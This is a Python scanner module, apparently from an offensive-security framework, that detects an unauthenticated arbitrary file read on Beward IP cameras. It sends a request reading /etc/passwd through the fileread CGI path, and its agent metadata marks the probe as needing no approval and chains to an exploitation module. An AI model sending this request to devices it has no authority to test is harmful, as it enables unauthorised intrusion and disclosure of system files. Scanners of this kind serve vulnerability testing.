#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Beward IP camera fileread arbitrary file disclosure."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Beward IP Camera - fileread Disclosure Detection',
        'description': (
            'Detects unauthenticated file disclosure via '
            '/cgi-bin/operator/fileread?READ.filePath=/etc/passwd on Beward IP cameras.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'beward', 'camera', 'iot', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/beward_fileread_file_read',
                    'scanner/http/cve_2025_34042_detect',
                ],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-34042',
        ],
    }

    def run(self):
        path = '/cgi-bin/operator/fileread?READ.filePath=/etc/passwd'
        r = self.http_request(
            method='GET',
            path=path,
            headers={'Accept-Encoding': 'gzip, deflate'},
            allow_redirects=False,
        )
        if r and re.search(r'root:.*:0:0:', r.text or '', re.I):
            self.set_info(
                severity='high',
                reason='Beward IP camera fileread disclosure',
                path=path,
            )
            return True
        return False
